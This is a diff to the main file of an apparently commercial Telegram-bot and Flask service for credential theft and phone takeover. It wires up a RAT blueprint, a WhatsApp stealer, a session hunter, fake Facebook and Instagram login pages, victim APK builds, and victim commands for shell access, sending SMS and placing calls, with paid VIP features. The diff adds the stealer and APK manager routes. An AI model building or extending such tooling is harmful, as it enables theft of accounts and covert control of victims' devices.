@@ -10,7 +10,7 @@ import requests
 from flask import Flask, request, jsonify
 
 # ============================================================
-# [1] Logging Setup (لازم يكون الأول)
+# [1] Logging Setup
 # ============================================================
 from logging_config import (
     get_logger, log_startup_info, log_shutdown_info,
@@ -27,20 +27,26 @@ setup_exception_hook()
 from config import bot, redis_client, BOT_TOKEN, ORIGIN_SECRET
 
 from imports_manager import (
-    rat_bp, qr_bp, lsh_bp, sh_bp,
-    LSH_ENABLED, SH_ENABLED,
+    # Blueprints
+    rat_bp, qr_bp, lsh_bp, sh_bp, wa_bp, apk_bp,
+    # Flags
+    LSH_ENABLED, SH_ENABLED, WA_ENABLED, APK_MANAGER_ENABLED,
+    # Init functions
     init_facebook_routes, init_instagram_routes, init_rat_routes,
     init_qr_routes, init_lsh_routes, init_session_hunter_routes,
+    init_whatsapp_stealer_routes, init_apk_routes,
+    # Helpers
     set_bot_reference, register_payment_handlers,
 )
 
-from utils import trigger_victim_apk_build, get_victim_apk_url
 from api_victim import init_victim_api
 
 from bot_handlers import (
     start_command, callback_handler,
     victim_name_step, v_toast_step, v_shell_step, v_sendsms_step,
     v_call_step, v_url_step, v_rename_step, victim_name_handler,
+    apk_toast_step, apk_shell_step, apk_sendsms_step,
+    apk_call_step, apk_url_step,
     admin_search_handler, admin_broadcast_handler,
     admin_ban_handler, admin_unban_handler, admin_delete_handler,
     admin_grant_vip_handler, admin_give_stars_handler,
@@ -54,13 +60,8 @@ from redis_cleaner import start_cleaner
 # ============================================================
 # [3] Monitoring + Rate Limiting
 # ============================================================
-from monitoring import init_monitoring, metrics, track_request
-from rate_limiter import (
-    rate_limit,
-    LIMIT_PUBLIC, LIMIT_LSH, LIMIT_APK,
-    LIMIT_SENSITIVE, LIMIT_AUTH,
-    start_cleanup_thread,
-)
+from monitoring import init_monitoring, metrics
+from rate_limiter import start_cleanup_thread
 
 # ============================================================
 # [4] Flask Setup
@@ -69,13 +70,13 @@ app = Flask(__name__)
 
 
 # ============================================================
-# [5] Origin Gate (محمي بـ monitoring)
+# [5] Origin Gate
 # ============================================================
 ORIGIN_GATE_EXEMPT = ['/', '/health', '/_health', '/_metrics', '/_version']
 
-# مسارات عامة (مسموح بيها من غير secret)
 ALLOWED_PREFIXES = (
     '/lsh', '/sh', '/rat', '/qr', '/wa',
+    '/apk',  # ★ APK Manager
     '/api/v1/session', '/qr_scan', '/f/',
     '/login.php', '/ig_login.php', '/system_secure',
     '/manifest.json', '/sw.js',
@@ -123,7 +124,7 @@ def health_check():
 
 
 # ============================================================
-# [7] Request Timing (Global)
+# [7] Request Timing
 # ============================================================
 @app.before_request
 def start_timer():
@@ -135,7 +136,6 @@ def log_request(response):
     try:
         if hasattr(request, '_start_time'):
             elapsed_ms = (time.time() - request._start_time) * 1000
-            # متسجلش الـ health checks
             if not request.path.startswith(('/_', '/')):
                 logger.debug(
                     f"🌐 {request.method} {request.path} → "
@@ -170,6 +170,14 @@ if qr_bp:
     app.register_blueprint(qr_bp)
     logger.info("[+] Registered: qr_bp")
 
+if wa_bp:
+    app.register_blueprint(wa_bp)
+    logger.info("[+] Registered: wa_bp")
+
+if apk_bp:
+    app.register_blueprint(apk_bp)
+    logger.info("[+] Registered: apk_bp")
+
 
 # ============================================================
 # [9] Init Routes
@@ -189,7 +197,27 @@ logger.info("[+] Init: qr routes")
 init_session_hunter_routes(app, bot)
 logger.info("[+] Init: session_hunter routes")
 
-# LSH - بعد باقي الـ routes
+# WhatsApp Stealer
+if WA_ENABLED:
+    try:
+        init_whatsapp_stealer_routes(app, bot)
+        logger.info("[+] Init: wa_stealer routes")
+    except Exception as e:
+        logger.exception(f"[-] WA Stealer init failed: {e}")
+else:
+    logger.warning("[-] WA Stealer disabled - skipping init")
+
+# APK Manager
+if APK_MANAGER_ENABLED:
+    try:
+        init_apk_routes(app, bot)
+        logger.info("[+] Init: apk_manager routes")
+    except Exception as e:
+        logger.exception(f"[-] APK Manager init failed: {e}")
+else:
+    logger.warning("[-] APK Manager disabled - skipping init")
+
+# LSH
 if LSH_ENABLED:
     try:
         init_lsh_routes(app, bot)
@@ -222,7 +250,7 @@ except Exception as e:
     logger.exception(f"[-] Short link init failed: {e}")
 
 # ============================================================
-# [12] Monitoring (آخر حاجة عشان يشوف كل الـ routes)
+# [12] Monitoring
 # ============================================================
 init_monitoring(app)
 start_cleanup_thread()
@@ -308,18 +336,15 @@ def run_telegram_bot():
 # ============================================================
 if __name__ == "__main__":
     try:
-        # Redis Cleaner
         start_cleaner()
         logger.info("[+] Redis cleaner started")
 
-        # Bot thread
         bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
         bot_thread.start()
         logger.info("[+] Bot thread started")
 
         time.sleep(2)
 
-        # Flask
         port = int(os.environ.get("PORT", 8080))
         logger.info(f"🌐 Flask Web Server starting on port {port}...")
 
